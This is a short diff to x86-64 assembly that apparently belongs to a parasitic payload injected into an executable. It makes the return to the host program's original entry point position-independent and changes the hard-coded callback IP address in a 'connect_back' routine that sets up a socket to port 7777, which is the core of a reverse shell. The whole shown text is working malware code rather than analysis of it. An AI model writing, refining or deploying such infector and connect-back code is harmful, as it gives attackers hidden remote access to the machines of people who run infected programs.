@@ -28,7 +28,12 @@ cleanup:
     pop rcx
     pop rax
 
-    push 0x400400           ; jump to original entry point
+    ; jump to original entry point
+    call get_pc
+get_pc:
+    pop rcx
+    sub rcx, 0x12345678
+    push rcx
     ret
 
 connect_back:
@@ -40,7 +45,7 @@ connect_back:
 
     mov r10, rax            ; save FD for later
 
-    push DWORD 0x1b64dc0a   ; IP address in reverse
+    push DWORD 0x2001a8c0   ; IP address in reverse
     push WORD 0x611e        ; Port
     push WORD 0x2           ; AF_INET = 2
 
